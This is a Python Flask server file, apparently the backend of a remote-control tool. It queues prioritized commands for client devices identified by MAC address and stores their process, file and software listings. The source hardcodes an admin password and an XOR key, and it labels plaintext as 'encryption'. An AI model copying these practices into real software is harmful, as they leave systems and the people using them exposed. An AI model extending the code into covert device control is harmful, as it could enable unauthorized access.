# -*- coding: utf-8 -*-
from flask import Flask, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify
from datetime import datetime
import os
import json
import time
import threading
import shutil


# 自动清理后台任务：删除超过24小时的缓存文件释放服务器空间
def clean_cache_task():
    while True:
        time.sleep(3600)  # 每小时检查一次
        now = time.time()
        for d in ['downloads', 'uploads']:
            d_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), d)
            if os.path.exists(d_path):
                for root, dirs, files in os.walk(d_path):
                    for f in files:
                        fp = os.path.join(root, f)
                        try:
                            if os.path.isfile(fp) and (now - os.path.getmtime(fp)) > 24 * 3600:
                                os.remove(fp)
                        except:
                            pass

threading.Thread(target=clean_cache_task, daemon=True).start()

USERNAME = 'gardenia'
PASSWORD = '7852136fgU'

def log_login_attempt(req, success):
    try:
        log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'login_log.txt')
        time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = req.remote_addr or req.environ.get('HTTP_X_FORWARDED_FOR', '')
        status = "成功" if success else "失败"
        ua = req.headers.get('User-Agent', '')
        with open(log_path, 'a', encoding='utf-8') as f:
            f.write(f"[{time_str}] IP: {ip} | 状态: {status} | User-Agent: {ua}\n")
    except:
        pass


UPDATE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_FILE = os.path.join(UPDATE_DIR, 'clients.json')
DB_BACKUP_FILE = os.path.join(UPDATE_DIR, 'clients.json.bak')
DB_UPDATE_BACKUP_FILE = os.path.join(UPDATE_DIR, 'clients.before_server_update.json')

VERSION_FILE = os.path.join(UPDATE_DIR, 'version.txt')
if not os.path.exists(VERSION_FILE):
    with open(VERSION_FILE, 'w', encoding='utf-8') as f:
        f.write("1.2.4")

def _load_json_file(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    return data if isinstance(data, dict) else {}

def _load_clients_db():
    candidates = []
    for path in [DB_FILE, DB_BACKUP_FILE, DB_UPDATE_BACKUP_FILE]:
        if not os.path.exists(path) or os.path.getsize(path) <= 2:
            continue
        try:
            data = _load_json_file(path)
            candidates.append((len(data), path, data))
        except Exception as e:
            print(f"Load clients DB failed from {path}: {e}")

    if not candidates:
        return {}

    candidates.sort(key=lambda item: (item[0], os.path.getmtime(item[1])), reverse=True)
    _, best_path, best_data = candidates[0]
    if best_path != DB_FILE:
        try:
            shutil.copy2(best_path, DB_FILE)
            print(f"Recovered clients DB from {best_path}")
        except Exception as e:
            print(f"Recover clients DB failed: {e}")
    return best_data

clients_db = _load_clients_db()

def backup_clients_db(reason='manual'):
    try:
        if os.path.exists(DB_FILE) and os.path.getsize(DB_FILE) > 2:
            shutil.copy2(DB_FILE, DB_BACKUP_FILE)
            if reason == 'server_update':
                shutil.copy2(DB_FILE, DB_UPDATE_BACKUP_FILE)
    except Exception as e:
        print(f"Backup DB Error: {e}")

def save_db():
    try:
        db_copy = {}
        for mac, info in list(clients_db.items()):
            safe_info = {}
            for k, v in list(info.items()):
                # 不要把庞大的返回结果（如进程列表、文件列表、服务列表、安装软件）存入本地硬盘JSON文件
                # 它们可能会在几秒内造成MB级别的文件不停写入，从而导致服务端卡死、请求超时
                if k not in ['stream_frame', 'file_result']:
                    if isinstance(v, (str, int, float, bool, type(None), list, dict)):
                        safe_info[k] = v
            db_copy[mac] = safe_info

        # Do not let a transient empty in-memory DB wipe an existing device database.
        if not db_copy and os.path.exists(DB_FILE) and os.path.getsize(DB_FILE) > 2:
            print("Save DB skipped: refusing to overwrite existing clients.json with an empty DB")
            return

        backup_clients_db()
        tmp_file = DB_FILE + '.tmp'
        with open(tmp_file, 'w', encoding='utf-8') as f:
            json.dump(db_copy, f, ensure_ascii=False)
            f.flush()
            os.fsync(f.fileno())
        os.replace(tmp_file, DB_FILE)
    except Exception as e:
        print(f"Save DB Error: {e}")

def is_online(last_seen_str):
    try:
        last_dt = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
        return (datetime.now() - last_dt).total_seconds() < 25 # 放宽离线判定到 25 秒
    except:
        return False

def init_client_queue(mac):
    """为新客户端初始化命令队列，防止KeyError"""
    if mac not in clients_db:
        return
    if 'cmd_queue' not in clients_db[mac]:
        clients_db[mac]['cmd_queue'] = []

def add_cmd_to_queue(mac, cmd, priority='normal'):
    """
    将命令添加到队列。
    priority: 'high' (立即执行), 'normal' (普通), 'low' (可合并/去重)
    返回: True 表示成功入队，False 表示队列满或客户端不存在
    """
    if mac not in clients_db:
        return False

    init_client_queue(mac)

    # 限制队列最大长度，防止内存溢出（最多存储100条待执行命令）
    if len(clients_db[mac]['cmd_queue']) >= 100:
        # 如果是低优先级命令且队列已满，直接丢弃
        if priority == 'low':
            return False
        # 如果是高优先级命令，清除最旧的低优先级命令
        for i, item in enumerate(clients_db[mac]['cmd_queue']):
            if item.get('priority') == 'low':
                clients_db[mac]['cmd_queue'].pop(i)
                break

    # 对于低优先级命令，检查队列中是否已存在相同命令（去重）
    if priority == 'low':
        for item in clients_db[mac]['cmd_queue']:
            if item['cmd'] == cmd:
                return True  # 已存在相同命令，无需重复入队

    clients_db[mac]['cmd_queue'].append({
        'cmd': cmd,
        'priority': priority,
        'timestamp': datetime.now().isoformat()
    })
    save_db()
    return True

def get_next_cmd(mac):
    """
    从队列中获取下一条命令。
    优先返回高优先级命令，其次是普通，最后是低优先级。
    """
    if mac not in clients_db:
        return None

    init_client_queue(mac)

    queue = clients_db[mac]['cmd_queue']
    if not queue:
        return None

    # 按优先级排序：high -> normal -> low
    priority_order = {'high': 0, 'normal': 1, 'low': 2}
    queue.sort(key=lambda x: priority_order.get(x.get('priority', 'normal'), 1))

    cmd_item = queue.pop(0)
    save_db()
    return cmd_item['cmd']

# ================= 数据加密解密支持 =================
ENCRYPTION_KEY = b'PowerOFF2026'

def encrypt_data(text):
    if not text: return ""
    return text  # 返回明文

def decrypt_data(hex_str):
    if not hex_str: return ""
    # 如果原本就是明文特征，直接返回
    if "-" in hex_str or "." in hex_str or "{" in hex_str or "[" in hex_str:
        return hex_str

    try:
        key = b"PowerOFF2026"
        raw = bytearray()
        if len(hex_str) % 2 != 0:
            return hex_str
        for i in range(0, len(hex_str), 2):
            byte_str = hex_str[i:i+2]
            b = int(byte_str, 16)
            raw.append(b ^ key[(i//2) % len(key)])

        # 验证解密结果是否符合可读ASCII，如果不符合则说明原本就未加密
        for enc in ("utf-8", "gbk", "latin-1"):
            try:
                text = bytes(raw).decode(enc)
                if text and all((ch in "\r\n\t" or ord(ch) >= 32) for ch in text[:10]):
                    return text
            except Exception:
                pass
        return hex_str
    except Exception:
        return hex_str

